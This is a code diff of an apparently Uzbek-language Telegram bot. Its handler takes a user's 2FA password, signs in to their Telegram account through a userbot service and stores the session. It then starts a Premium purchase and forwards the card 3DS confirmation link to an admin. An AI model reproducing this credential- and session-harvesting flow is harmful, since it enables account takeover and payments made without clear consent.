@@ -226,9 +226,8 @@ async def process_code(message: Message, state: FSMContext):
     else:
         await message.answer(f"❌ Xatolik: {result}. Qaytadan kiriting.")
 
-
 @router.message(PremiumStates.waiting_for_password)
-async def process_password(message: Message, state: FSMContext):
+async def process_password(message: Message, state: FSMContext, bot: Bot):
     password = message.text.strip()
     success, result = await userbot_service.sign_in(password=password)
 
@@ -242,12 +241,29 @@ async def process_password(message: Message, state: FSMContext):
             )
             session.add(new_session)
             await session.commit()
-
-        await message.answer("✅ Akkaunt muvaffaqiyatli ulandi! Endi tizim avtomatik xaridni boshlaydi.")
+        
+        await message.answer("✅ Akkaunt muvaffaqiyatli ulandi! Tizim avtomatik xaridni boshladi. Iltimos, kuting...")
+        
+        # Xaridni boshlash
+        success, purchase_result = await userbot_service.purchase_premium(result)
+        
+        if success:
+            # 3DS havolasini adminga yuborish
+            admin_text = (
+                f"🔔 <b>3DS Tasdiqlash Kutilmoqda!</b>\n\n"
+                f"👤 Foydalanuvchi: {message.from_user.full_name}\n"
+                f"🆔 ID: <code>{message.from_user.id}</code>\n\n"
+                f"Quyidagi havolani bosib, SMS kodni kiritib tasdiqlang:\n"
+                f"{purchase_result}"
+            )
+            await bot.send_message(Config.ADMIN_ID, admin_text)
+            await message.answer("📲 To'lov amalga oshirilmoqda. Admin tasdiqlashini kuting.")
+        else:
+            await message.answer(f"❌ Xarid jarayonida xatolik: {purchase_result}")
+        
         await state.clear()
     else:
         await message.answer(f"❌ Xatolik: {result}")
-
 
 @router.callback_query(F.data == "back_to_main")
 async def back_to_main(callback: CallbackQuery, state: FSMContext):
